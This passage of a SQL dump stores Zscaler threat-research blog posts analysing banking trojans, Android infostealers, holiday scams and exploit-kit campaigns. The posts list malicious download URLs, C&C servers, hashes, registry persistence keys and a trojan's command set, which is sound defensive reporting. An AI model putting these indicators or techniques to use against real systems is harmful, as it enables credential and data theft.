do away with passwords altogether. While not as user friendly, most major Internet layers are also adding two-factor authentication as a standard option. Finally, the average user has realistic authentication options that don’t involve sticky notes.    Say goodbye to browser plugins  The love affair with browser plugins has been on the decline and we’re finally at a point where the average user can do away with them once and for all. Flash had a particularly tough year after Firefox disabled the plugin by default after the Hacking Team breach revealed the existence of new Flash 0days. Facebook’s Security Chief also piled on asking “Adobe to announce an end-of-life date for Flash”. This after Steve Jobs famously refused to include Flash on iOS, claiming that it had been the “number one reason Macs crash” and had “one of the worst security records”. The bashing certainly isn’t unfounded with browser plugins remaining the number one way that Exploit Kit authors target PCs, primarily targeting Java, Flash and PDF vulnerabilities. At least for websites, Flash is on life support, Java died a couple of years ago and PDF plugins are no longer required as bowser vendors have baked in native support. Competitors like SilverLight never fully caught on and web apps that would historically have used custom plugins for playing video or screen sharing, have now migrated to HTML5. Not supporting plugins was one things that mobile browsers got right from the get go. In 2016, expect all major browsers to get serious about finally killing off plugin support by default.    The encryption showdown  Encrypted communications have long been the bane of law enforcement and those in the intelligence communities. As privacy concerns mount, thanks in part to the Snowden revelations, leveraging strong encryption for messaging and data storage is no longer the realm of geek speak. It is an expected feature and is quickly becoming a differentiating feature. iOS now encrypts data by default and Android while lagging behind, is fighting to get there. Popular chat applications like WhatsApp tout encryption as a key feature and Apple’s iMessage app, which features end-to-end encryption and no central key store, is often referenced by law enforcement when arguing for a ‘back door’. 2016 will be the year this battle comes to a head. While politicians used to dance gingerly around the topic given the privacy abuses exposed by the Snowden revelations, recent terrorist attacks have brought this issue front and center. Multiple pieces of legislation are sure to be introduced that will propose weakened encryption protocols or procedures to grant law enforcement access to decrypted communications as needed. As we’ve learned however, you can’t be ‘mostly secure’ any more than you can be ‘kind of pregnant’. Weakening encryption to benefit law enforcement will also reduce security for everyone and if the US government mandates a ‘backdoor’, you can be rest assured that China, Russia, [pick a country] will be demanding the same for their citizens. This is one battle that will have serious repercussions for years to come. Here’s to hoping that Apple, Google, Microsoft, Yahoo! and the like manage to prevail.    Should be another action packed year on the cyber security front. See you next year!    Michael Sutton  CISO  Zscaler', 'Data Breach;Encryption;Mobile', 'https://www.zscaler.com/blogs/research/2016-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (116, 'New Spy Banker Trojan Telax Abusing Google Cloud Servers', 'Deepen Desai', 'December 10, 2015', 'Introduction  Zscaler ThreatLabZ has been closely monitoring a new Spy Banker Trojan campaign that has been targeting Portuguese-speaking users in Brazil. The malware authors are leveraging Google Cloud Servers to host the initial Spy Banker Downloader Trojan, which is responsible for downloading and installing Spy Banker Trojan Telax.    The attackers are using social engineering tactics, such as offering coupon vouchers and free software applications like WhatsApp and Avast antivirus, to lure the end user into downloading and installing the malicious payload. Social networking sites Facebook and Twitter are primarily being used to spread a shortened URL (using bit.ly service) that points to a Google Cloud Server hosting the malicious payload with .COM or .EXE file extensions.  Campaign Details  The attack starts with a shortened URL posted on a social networking site or via drive by download from malicious sites posing to offer premium software or coupons. Below is a recent attack chain where the user clicked on a link shared via Facebook that lead to the download of Telax payload:       	  		  			  		  		  			Figure 1: Spy Banker Telax served via Facebook  		  	            The bit.ly link points to a PHP file hosted on the Google Cloud Server that does a 302 redirect to download the initial Spy Banker Downloader Trojan payload.    The executable file receitanet.com is posing to be Brazil\'s federal revenue online tax returns service. We have also seen other themes offering fake premium software applications and discount vouchers as seen from the file names below.    Malicious payload file names:      	americanas.com  	americanas.exe  	app.ricardoeletro.com  	atube.com  	avast.com  	AvastPro.exe  	baixaki.com  	receitanet.com  	ricardoeletro.com  	setup.exe  	submarino.com  	voucher.americanas.com  	voucher.mercadolivre.com  	voucher.ricardoeletro.com  	walmart.com  	web.whatsapp.com  	whatsapp_setup.exe  	WhatsApp_Setup.exe    Below are the statistics (credit: Bit.ly) on the number of users clicks that were recorded for the attack campaign shared in Figure 1:       	  		  			  		  		  			Figure 2: User clicks on the malicious bit.ly link  		  	    Majority of the target users were lead to the malicious bit.ly link from Facebook as seen below:       	  		  			  		  		  			Figure 3: Source for the bit.ly link visits  		  	      In addition to social networking sites, we also saw users arriving to the Spy Banker Telax payloads hosted on Google Cloud servers from the following sites:    	aquinofinal[.]com  	aquiredire[.]com  	brasildareceita[.]com  	mundodareceita[.]com  	ofertasplusdescontos[.]com    All but one of the domains listed above are repossessed by Go Daddy and are no longer active. A quick WhoIs look up of the active domain shows that it was recently registered to \'kleyb maxbell\' with following information:       	  		  			  		  		  			Figure 4: Whois information for an attack domain  		  	    We found another domain \'ofertasmaxdescontos[.]com\' registered by the same user that also appears to be actively redirecting users to the malicious payload hosted on a predetermined Google Cloud Server as seen below:       	  		  			  		  		  			Figure 5: Active attack domains  		  	      It is important to note that Google has already cleaned up the cloud servers being currently redirected by these two active sites and hence the infection cycle will fail with a 404 Not Found message.    Geographic distribution of the users attempting to download the end malicious payload from Figure 1 is shown below:       	  		  			  		  		  			  			        Figure 6: Geographic distribution of target users  			  		  	      As expected, majority of the users targeted by this malware campaign are from Brazil. It is important to note that the success of this attack depends primarily on the social engineering tactics in convincing the end user into opening the downloaded payload.     Spy Banker Trojan Telax analysis  The initial file that gets downloaded is the Spy Banker Downloader Trojan. The Downloader Trojan is responsible for downloading & executing the final payload from a list of predetermined URLs as seen below:       	  		  			  		  		  			Figure 7: Downloader Trojan hardcoded URLs  		  	    The final payload, Spy Banker Trojan Telax, is a Delphi executable that is capable of stealing Banking credentials targeting Portuguese users. Upon execution, Telax injects malicious code into legitimate Visual Basic Compiler (vbc.exe) process. The injected code first checks for the presence of virtual environment like VMWare, Virtual Box, Wine and Virtual PC on the target system.    Telax executable contains following additional files embedded in it\'s resource section:    	SQLLite.dll - legitimate SQL Lite binary  	32-bit rootkit component  	64-bit rootkit component  	64-bit copy of itself      Depending on the bit-ness of the target operating system, Telax will register the appropriate rootkit driver:    HKLM\\SYSTEM\\CurrentControlSet\\Services\\hookmgr\\ImagePath: \"<User>\\<CurrentLocation>\\hookmgr.sys\"  The main form that we extracted from the malicious Delphi binary is named \'Telax\' by the author and can be seen below:       	  		  			  		  		  			Figure 8: Spy Banker Telax main form  		  	      Here is the translation for the pre-configured features found in this bot:       	Auto Reconectar se perder conexao -> Auto Reconnect lost connection  	bloquear VM -> VM block  	Proteger Processo -> Protect Process  	Mensagem de instalacao -> Message installation  	Gerar infect -> Generate infect  	Ativar host -> Enable host  	ativar update -> Activate update  	ativar killer -> Activate killer  	ativar Worm -> Activate Worm  	Versao -> Version  	Porta -> Port      Following are the additional Telax modules that we looked at during our analysis:    A. Modulename: TnHulk.MITO  Detects installed Antivirus applications on the system. It specifically looks for following antivirus executables on the target system:  BavUpdater.exe - Baidu Antivirus  instup.exe - Avast  avgmfapx.exe - AVG  Update.exe - Symantec    B. Modulename: TTitulo.IPTX  Responsible for decrypting embedded strings in the file.    C. Modulename: TXRPD  Responsible for installing malware on the system.    D. Modulename: TLISTING  Contains the rootkit functions    Network Communication  Upon successful installation, Telax sends following information to a remote Command & Control (C&C) server:       	ID_MAQUINA - Machine ID  	VERSAO - Bot version  	WIN - Operating system  	NAVEGADOR - Default browser  	PLUGIN - Presence of G-Buster Browser Defense (gbieh.dll) plugin  	AV - Antivirus installed           	  		  			  		  		  			Figure 9: Telax C&C communication  		  	        Following are the C&C commands that are used by Telax for its communication:       	  		  			Command  			Description  		  		  			<|PING|>  			Checking status of connection  		  		  			<|Info|>  			Sends infected OS details and bot version  		  		  			<|Close|>  			Close all connections  		  		  			<|DESI|>  			Uninstall itself  		  		  			<|reini|>  			Restart system  		  		  			<|REQUESTINFO|>  			Request for information regarding installed AntiVirus, AntiSpyware and Firewall  		  		  			<|REQUESTKEYBOARD|>  			Sends keystrokes to active application window  		  		  			<|HjiopPos|>  			Set mouse position  		  		  			<|HjiopLD|>  			Set mouse left button down  		  		  			<|HjiopLU|>  			Set mouse left button up  		  		  			<|POWT|>  			Type given string in current window  		  		  			{DESMON}  			Sets the state of the display using WM_SYSCOMMAND window message  		  	        We also found fake panels for two-factor authentication that will presumably be used to capture and bypass the two-factor authentication mechanism.         	  		  			  		  		  			Figure 10: Fake two factor authentication panel  		  	      Telax Downloader Hashes  1101C68DF9B31D1C086902D12ECC8521  14066DDD16BF58CD8815F19B183A2801  18FDAA5C3BC8519798912DD8CFDBA0FD  391022155B4BF56309E335308CA86E9D  3DF54DA82678F377FE3FA0AC2122550B  3EAD81990D055C6B7F9F026912D06C28  47ADF66B8AADFA147FF4E528B9F1ADC1  4AA96DC421E509C51F69BF3253702FC4  53D7A67EBF62150288FABF3AA38F0D06  5B3C393563FEEFE50D5B79B555896EA2  695C89E87D18FE9C7BBEBD65E2DA8308  6D27E0A7F9753DCD27B0418023077342  6DC1168629BBFD1AF343B13E08C0FC72  710E945AC8247B3F8B19022A9401E351  9648CED20C9BBD304F3234644842F663  A87112588AD6F5DD4C4D8F88442F6B66  B037980732D665EE46662A2D3D5D067D  BA6F9083D4F559BBBC000806C6357C9F  C4EBF36C756504F30D80BEDAECC27AF9  CF2D555048B87BED05D0486F00209797  D1D29793D9FA4DDD3FA8AD66903CB75F  D63D2A72EAA672F2BC46901CC460308B  DF08C8549F14AAE4CAC8FF46640212CA  F0416E5EF08E2DE12B409F51E42C7A31  Conclusion  Spy Banker Telax is a Banking Trojan that has specifically targeted Portuguese users. The malware authors are actively pushing out new versions of Telax (latest version 4.7) binaries and are abusing Google Cloud Servers to host the payload for infection. There is no vulnerability exploit being used in this campaign and the attackers are solely relying on social engineering to infect the end users.    Zscaler’s ThreatLabZ has confirmed coverage for the initial downloader and Telax payloads, ensuring protection for organizations using Zscaler’s Internet security platform.    Research by: Deepen Desai, Nirmal Singh, Lenart Brave', 'Malware', 'https://www.zscaler.com/blogs/research/new-spy-banker-trojan-telax-abusing-google-cloud-servers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (117, 'Black Friday Deals On Malware & Scams', 'Chris Mannon', 'November 27, 2015', 'The holiday season means different things to a lot of people. For some, it’s a time for family and extravagant meals. For others, it’s a time for charity and giving more than your best to your partner. Yet for others still...it’s time to shop. Black Friday is once again upon us. That magical time of the year when we take to the high street or internet, hoping to find a good deal on that new device you’ve been window shopping for the last month. Users beware! There is more harm than good that can be done from clicking on what appears to be a good deal. During this time of the year, the internet runs amok with an increase of phishing and scam websites looking to exploit your consumer instincts.    The Zscaler ThreatLabZ team has been monitoring a subset of opt-in data to discover a correlation between shopping activity and scams. As an effect of increased shopping behavior, we\'ve observed a steady number of scams clicked on by users. Scammers take notice of trending topics as well and us consumer’s impaired judgement to cast a wide net of phishing, fraud, and scam attacks meant to capitalize on the shopping season. Whether you are using a mobile device or your home PC, the uptick in shopping trends remains relevant.                     As shown in the graphs, the trend in phishing activity tends to rise with the amount of online shopping traffic, which comes with the added risk of scammers taking advantage of a consumers better judgement.                        Vawtrak Botnet Scam  Our first case study illustrates the danger of these fraudulent deals. The botnet, Vawtrak (also known as NeverQuest and Snifula), is a powerful information stealing backdoor Trojan that has been gaining momentum over past few months. It primarily targets user\'s bank account via online banking websites. We’ve come across numerous reports, where users begin the infection cycle through spam e-mails promising a sales deal. This case appears to be no different, as we see the Pony Trojan Downloader being leveraged to download the Vawtrak payload.      	salesdeal.magentochile[.]cl/f1.exe    VirusTotal has this threat marked as a fairly well known sample with a score of 32/55 at the time of research. Vawtrak is a treacherous botnet that is known to target the user’s saved banking credentials or even keylog for other passwords. Vawtrak achieves this by manipulating key Windows processes and lowering security settings to ensure that its Command and Control traffic can be reached.    Savvy users that suspect themselves to be afflicted with this threat should look for similar suspicious files:    	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\Temp\\~DFECDDE19F2005BD31.TMP  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Kapag  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.dll  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.exe  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Qucuz  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Sofolq  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\Uoqet  	C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\YidaLboz    The folder name in the ‘Local’ Directory will be named randomly. The fastest option to make sure you are targeting the right directory is to have a quick look at what programs are AutoStarting in the registry. In this instance, the following location was observed:      	HKU\\[USER-ID]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WopuVdax: \"regsvr32.exe \"C:\\Users\\[COMPUTERNAME]\\AppData\\Local\\SuyaDruj\\KuhaKqigd.dll\"\"                   Once the infection is successful, the Internet Settings are lowered to accommodate suspicious beaconing activity. The following was observed in our execution of the malicious sample:      	HKU\\S-1-5-21-4274511564-889519498-3811658521-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\2500: 0x00000000  	HKU\\S-1-5-21-4274511564-889519498-3811658521-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\2500: 0x00000003       Upon successful manipulation of the Internet Settings, command and control attempts are made.                       The threat responds with a list of locations to fetch configuration files as well as other malicious payloads. In the instance we observed, we received the keylogging Botnet, NetWired.    NetWired leaves two files actively running which beacon to suspicious destinations. These processes collect and exfiltrate stolen data to the threat actors.                         The NetWired botnet communicates with the following server IPs from our research:      	109[.]163[.]226[.]153  	213[.]152[.]162[.]99  	31[.]184[.]194[.]138  	46[.]161[.]1[.]172  	46[.]165[.]208[.]108  	46[.]20[.]33[.]82  	62[.]102[.]148[.]181  	95[.]211[.]229[.]148      Free iPhone6 scams    Lots of scam sites are offering a free iPhone 6 to lure victims into click fraud attacks. Scam sites also ask for personal information like phone number, address, or e-mail address. Victims end up losing their personal information that can be further leveraged into future scams. The below screenshot shows scammers doing their best to make a site look like an official Apple site.                       Some scams also ask for shipping fees to collect additional funds as well as sensitive information.               Scammers leverage brand names to provide an air of legitimacy to their scam websites. Some examples we have seen:      	http[:]//apple[.]com[-]freegiveaway[.]com  	http[:]//applestore[.]officialfreegiveway[.]com/  	http[:]//facebook[.]officialfreegiveway[.]com/  	http[:]//8sd5ug[.]getafreeiphone6splustoday[.]com/  	http[:]//giveaways[.]xyz/iphone[-]giveaway/  	http[:]//iphone6[.]howtogetafree[.]eu/           We recently covered a fake app offering early access to Amazon.com Black Friday and Cyber Monday offers and deals. With the rise in mobile device usage for browsing and shopping activities, we expect to see more and more instances of such fake applications with exciting offers targeting mobile users.    How can online shoppers protect themselves?  Thanksgiving marks the start of the holiday shopping season which continues through Christmas. The Zscaler ThreatLabZ team is working around the clock to ensure that our customers do not fall prey to such malicious activity.    We highly recommend that all online shoppers exercise extreme caution and follow our holiday season shopping security checklist:    	Inspect the source of emails with enticing shopping deals. Be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Ensure HTTPS/secure connections to online retailers and banking sites  	Check the authenticity of the URL or website address before clicking on a link  	Stay away from e-mailed invoices - this is often a social engineering technique used by cyber criminals  	Do not use insecure public WiFi for shopping  	Use two-factor authentication whenever possible especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Backup your documents and media files  	Review the Identity Theft Guide and FAQ from the Federal Trade Commission.      Wishing you all a very Happy Thanksgiving!', 'Social Engineering', 'https://www.zscaler.com/blogs/research/black-friday-deals-malware-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (118, 'This Thanksgiving, Deals On Your Private Data Too', 'Viral Gandhi', 'November 24, 2015', 'In a matter of years, we’ve seen Black Friday and Cyber Monday become two of the most anticipated days of the calendar year. While consumers eagerly await the chance to buy this season’s hottest gifts, what they don’t realize is that hackers are also anticipating a holiday treat: their personal data. This weekend, Zscaler uncovered a campaign where malware turning the holiday shopping season into an opportunity to scam large number of people by creating fake apps offering early access to Amazon.com Black Friday and Cyber Monday offers and deals.\r\n\r\nThe Zscaler research team recently came across one such fake amazon app which was masked as an Amazon.com Black Friday deals app, but actually intended to collect victim\'s personal data. The URL from where this fake app is downloaded is as shown below:\r\n\r\n\r\n	URL :  http[:]//amazon[.]de[.]offer47263[.]cc/amazon[.]apk\r\n\r\n\r\nFrom the URL it can be observed that the malware authors are using cyber squatting to fool the victim and portraying itself as a legitimate Amazon site.\r\n \r\n\r\n\r\nOnce the application gets installed it disguises itself as a legit Amazon app.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Icon\r\n		\r\n	\r\n\r\n\r\nWhen the user starts this installed fake Amazon app, it loads another app named \"com.android.engine\" as seen below.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Loading application dynamically\r\n		\r\n	\r\n\r\n\r\nThis newly loaded child application asks for administrative privileges and other risky permissions like sending SMS and dialing phone numbers.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Permissions\r\n		\r\n	\r\n\r\n\r\nThis newly loaded app will first register itself as a service. Even if we remove the fake Amazon app, the \"com.android.engine\" app will stay persistent and keep doing its activity in the background. Once this malicious app is installed on the victim\'s phone, the fake Amazon application will start giving the error message: \"Device not supported with App\". This forces the victim to delete the fake amazon app thinking that there were some errors while installing it. As the malicious child app does not have any icon, it is quite difficult for the common users to remove the app.\r\n\r\n\r\nThe presence of this app can be seen in Settings>Apps>Running Applications section of device as shown below. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Silently working in backgroud\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Administrative access\r\n		\r\n	\r\n\r\n\r\nThis loaded malicious application has code for harvesting user\'s personal data.\r\n\r\nThe following code routine present in the app is used to collect victim\'s browser history and bookmarks.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Browser data\r\n		\r\n	\r\n\r\n\r\nIt is also able to harvest the call logs, received inbox messages and segregate it into sender\'s numbers, SMS body, received incoming call number and contact name etc as shown below.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Call logs\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Inbox messages\r\n		\r\n	\r\n\r\n\r\n\r\nThe malicious app also gathers victims contact details.\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Contacts\r\n		\r\n	\r\n\r\n\r\n\r\nThis particular piece of malware was also found to be communicating with an IP address in Canada, \"198[.]50[.]169[.]251\" on port 4467 probably sending the harvest data through network socket.\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Hard coded IP\r\n		\r\n	\r\n\r\n\r\nThe following packet capture shows the malware communication with its C&C(Command and Control Center).\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Packet Capture\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Data being sent\r\n		\r\n	\r\n\r\n\r\n\r\nEspecially during this holiday season, consumers need to be aware of the applications they’re downloading and stay away from such fake apps. Always install applications from legitimate app stores and websites. Be aware of the permissions asked by the application during installation. Shopping apps should not be asking for access to your contacts or SMS. Keeping an eye on the permissions used by the app can save you from installing such fake apps.\r\n \r\n\r\nHappy Thanksgiving to all !!', 'Malware;Mobile', 'https://www.zscaler.com/blogs/research/thanksgiving-deals-your-private-data-too');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (119, 'Pornography - A Favorite Costume For Android Malware', 'Viral Gandhi', 'November 23, 2015', '30% of Internet traffic is in some way related to pornography and this is the primary reason why malware authors are using porn apps to infect large numbers of users. During recent data mining, we noticed an increasing volume of mobile malware using pornography (disguised as porn apps) to lure victims into different scams and stealing personal data or locking phones and demanding ransom payments. We recently wrote about Android Ransomware and an SMS Trojan leveraging pornography to scam victims. In this blog we share the analysis of two adult themed malicious apps - SMS and Infostealer Trojans that we recently spotted.           Case 1: SMS Trojan      Here we look at a Chinese SMS Trojan disguised as porn app. Upon installation, the malware fools the victim by displaying random adult sites, steals sensitive information and sends SMS to predetermined Chinese numbers in the background.           	Name : 浴室自拍  	URL:  http://yg-file.91wapbang[.]com/apk/appad/14461771841467103.apk?uid=ef2592f22af8c568f2b2993467a1e21a  	Package Name : com.uryioen.lkhgonsd  	Flagged by 6/53 AVs on VirusTotal at the time of analysis.    The malware installs the app with a lewd icon as shown below.      	  		  			  		  		  			Icon  		  	          Once a user clicks on the icon, the user will be directed to a random URL from an array defined in the main code module. Interestingly, all the URLs are encoded in base64 format.          	  		  			  		  		  			Base64 URLs  		  	          List of URLs:           	 http://www.4493[.]com/star/sifang/(aHR0cDovL3d3dy40NDkzLmNvbS9zdGFyL3NpZmFuZy8=)  	 http://m.mnsfz[.]com/h/meihuo/(aHR0cDovL20ubW5zZnouY29tL2gvbWVpaHVvLw==)  	 http://m.4493[.]com/gaoqingmeinv/(aHR0cDovL20uNDQ5My5jb20vZ2FvcWluZ21laW52Lw==)  	 http://www.mm131[.]com/xinggan/(aHR0cDovL3d3dy5tbTEzMS5jb20veGluZ2dhbi8=)  	http://www.5542[.]cc/xingganmeinv/(aHR0cDovL3d3dy41NTQyLmNjL3hpbmdnYW5tZWludi8=)  	http://www.100mz[.]com/a/xingganmeinv/(aHR0cDovL3d3dy4xMDBtei5jb20vYS94aW5nZ2FubWVpbnYv)  	http://m.xgmtu[.]com/( aHR0cDovL20ueGdtdHUuY29tLw==)    The malware is collecting all the device information in the background and sending it to a remote Command & Control (C&C) server as seen below.      	  		  			  		  		  			Post Request  		  	          The C&C server responds back to the bot with further instructions as seen below.      	  		  			  		  		  			Response  		  	          The C&C response in screenshot shows the malware receiving a phone number with content that needs to be sent to that number via SMS. The following code shows how the malware will parse this response and start sending SMS messages.              	  		  			  		  		  			Send SMS code  		  	        	  		  			  		  		  			SMS  		  	      After sending the message, the malware sends another POST request notifying the C&C server about the sent SMS activity.         	  		  			  		  		  			Post Request  		  	                 	C&C server - http[:]//www[.]mscdea[.]com:7981         This activity occurs once a day at a random time interval where the malware sends a post request to the C&C server and receives phone numbers with SMS content to be sent out.                                       The continuous SMS activity can lead to a significant financial loss for the victim.        Case 2: Fake Ransomware stealing personal data        The malware in this case is trying to scare the user with a warning screen accusing them of watching child porn. The malware steals victim\'s personal data in background and send it to C&C server.           	URL: http://maturefuckporn[.]info/download/kyvcuwc/diper/video.apk (down as of now)  	App Name :  video  	Package Name : com.gi.to  	Flagged by 12/53 AV vendors on VirusTotal.         Upon installing the app on device, the user will see a video player icon on the screen.      	  		  			  		  		  			Icon  		  	          Once the user clicks on the icon, the malware displays a fake warning page as seen below. The warning page pretends to be from the Industrial Control Systems - Cyber Emergency Response Team (ICS-CERT) but is different from the classic FBI/Police Ransomware pages.      	  		  			  		  		  			Warning page  		  	          The malicious app does not ask for administrative privileges to lock the device and is fairly easy to remove. We did not find any code for locking the device. The malware harvests inbox messages, contacts & e-mail addresses, which are then relayed to a remote C&C server in the background.         	  		  			  		  		  			Collecting data  		  	          The malware logs the harvested SMS messages & sender\'s phone number in a specific format to a temporary file as seen in the code snippet above.         	  		  			  		  		  			C&C construction.  		  	          The screenshot above shows the C&C URI construction code. The file containing the stolen data is then sent to the remote C&C server as seen in the network capture below.         	  		  			  		  		  			Post capture.  		  	          The stolen SMS messages being sent to the C&C server in a file.      	  		  			  		  		  			Inbox messages  		  	          The stolen contacts & e-mail addresses being sent to the C&C in a file      	  		  			  		  		  			Contacts  		  	                 	C&C server - http[:]//maturefucklist[.]com      Conclusion    We are seeing an increasing number of adult themed Android malware apps using pornography to lure victims. To avoid being  a victim of such malware, it is always best to download apps only from trusted app stores, such as Google Play. This can be enforced by unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device.', 'Mobile;Mobile Malware', 'https://www.zscaler.com/blogs/research/pornography-favorite-costume-android-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (120, 'International Council Of Women Site Leading To Nuclear & Kelihos', 'Dhanalakshmi', 'November 06, 2015', 'Introduction  We recently wrote about a compromised Chinese government site leading to an Angler Exploit Kit (EK) infection cycle. Nuclear EK operators are on par with their Angler EK peers in terms of the activity we are seeing in the wild. During our course of EK hunting, we came across a popular multinational organization, the International Council of Women (ICW), being compromised and leading users to a Nuclear EK landing site. The end user will get infected with the information stealing Kelihos bot if the exploit cycle is successful.    Compromised site - ICW  The following screenshot shows the malicious iframe injected on the compromised website.       	  		  			  		  		  			Compromised ICW web page  		  	         The malicious iframe leads users to a Nuclear EK landing site as seen below.       	  		  			  		  		  			Nuclear EK redirection  		  	      The Nuclear EK landing page is heavily obfuscated to evade security software detection as shown below.       	  		  			  		  		  			Nuclear EK landing page  		  	      Upon successful execution of the obfuscated JavaScript, a malicious Flash file is downloaded on the victim\'s machine as seen below.       	  		  			  		  		  			Flash Exploit Download  		  	         Kelihos Payload Analysis  Upon successful exploitation, a new variant of the Kelihos bot is downloaded and installed on the victim machine. Here are some of the download locations for the Kelihos bot that we have seen in this campaign:     hxxp://46.63.32[.]75/harsh02.exe   hxxp://95.65.55[.]6/harsh02.exe           hxxp://31.202.178[.]239/harsh02.exe       hxxp://37.233.40[.]97/harsh02.exe       hxxp://178.136.213[.]107/harsh02.exe            	  		  			  		  		  			Final Payload Download  		  	      Kelihos is a Trojan family that distributes spam email messages. The malware communicates with remote servers to exchange information that is used to execute various tasks, including sending spam email, capturing sensitive information or downloading and executing arbitrary files.    The malware executable file is a Microsoft Visual C++ 6.0 compiled binary with custom packed content stored in the executable\'s overlay section. Kelihos installs WinPcap, a legitimate and commonly used Windows packet capture library at the following locations:    	%system32%\\winpcap.dll  	%system32%\\Packet.dll  	%system32%\\drivers\\npf.sys    Note: %system32% is c:\\windows\\system32    It uses hard coded User-Agents from the following list when communicating with the remote host:       	  		  			  		  		  			Crafted User-Agent  		  	    Kelihos tries to steal the login credentials of FTP and POP3 applications by monitoring the network traffic of the victim\'s machine using the installed WinPcap libraries. The bot checks for the presence of the following applications on the victim machine and attempts to steal login credentials, digital currency and other information:      	3D-FTP  	Bitcoin  	BitKinex  	BlazeFtp  	Bullet Proof FTP  	Classic FTP  	Core FTP  	CuteFTP  	Cyberduck  	Directory Opus  	FFFTP  	FileZilla  	Frigate3  	FTPGetter  	LeapFTP  	FTPRush  	xterm  	PuTTY  	SecureFX  	SmartFTP  	Bitcoin  	BitKinex      The malware extracts stored information such as usernames, passwords and host names from the following browsers:      	Google\\Chrome  	Chromium  	ChromePlus  	Bromium  	Nichrome  	Comodo  	RockMelt  	CoolNovo  	MapleStudio\\ChromePlus  	Yandex    Kelihos communicates to Command & Control (C&C) servers using HTTP via messages encrypted using the Blowfish symmetric-key algorithm.       	  		  			  		  		  			Post Infection Communication  			   			   		  	      Conclusion         Nuclear EK remains a worthy rival to Angler EK, with widespread campaigns, regular exploit payload updates, new obfuscation techniques and new malware payloads. The end malware payload we saw in this campaign was the information stealing Kelihos bot which has extremely low AV detection.            ThreatLabZ is actively monitoring new Nuclear EK infections in the wild and ensuring that Zscaler customers are protected.    Research by Dhanalakshmi PK and Rubin Azad', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/international-council-women-site-leading-nuclear-kelihos');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (121, 'Chinese Government Website Compromised, Leads To Angler', 'ThreatLabz', 'November 03, 2015', 'Introduction\r\nDespite a recent takedown targeting the Angler Exploit Kit (EK), it\'s back to business as usual for kit operators. On 30-October-2015, ThreatLabZ noticed a compromised Chinese government website that led to the Angler Exploit Kit with an end payload of Cryptowall 3.0. This compromise does not appear targeted and the compromised site was cleaned up within 24 hours. We have noticed some recent changes to Angler, as well as the inclusion of newer Flash exploits. A set of indicators for this compromise is at the end of this post.\r\n \r\nCompromised Site\r\nThe \"Chuxiong Archives\" website, www.cxda[.]gov.cn, was compromised with injected code. The site has a similar look and feel to both the Chuxiong Yi Prefecture and Chuxiong City websites and appears somewhat inactive, but surprisingly the site was remediated in less than 24 hours. The full infection cycle from compromised site to encrypted payload is shown in the fiddler session below.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 1. Infection cycle\r\n		\r\n	\r\n\r\nThe injected code was before the opening HTML tag and was heavily obfuscated. The code, shown below, is very similar to other recent compromises we\'ve observed and was present on every page of the site, suggesting a complete site compromise.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 2. Injected script\r\n		\r\n	\r\n\r\nConsistent with other recent examples, the injected code appears to target Internet Explorer (IE) since Firefox and Chrome consistently throw errors when attempting to execute the code and no redirection occurs. IE has no issues executing the code, however, which unsurprisingly decodes to an iframe leading to an Angler EK landing page:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 3. Decoded injected code\r\n		\r\n	\r\n\r\nWhile we did not have access to the server-side code, it likely retrieves landing page URLs from a remote server since we observed iframes leading to multiple different Angler domains within a brief period of time.\r\n\r\nLanding Page\r\nThe landing page for Angler is immediately recognizable, but with some notable recent changes. For example, instead of using a long block of around seven-character long strings inside divs tag, the newer landing pages use \'li\' tags and most of the strings are only about two characters long. Additionally, there\'s a conspicuous \'triggerApi\' function toward the top of the main script block:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 4: Short strings and triggerApi function\r\n		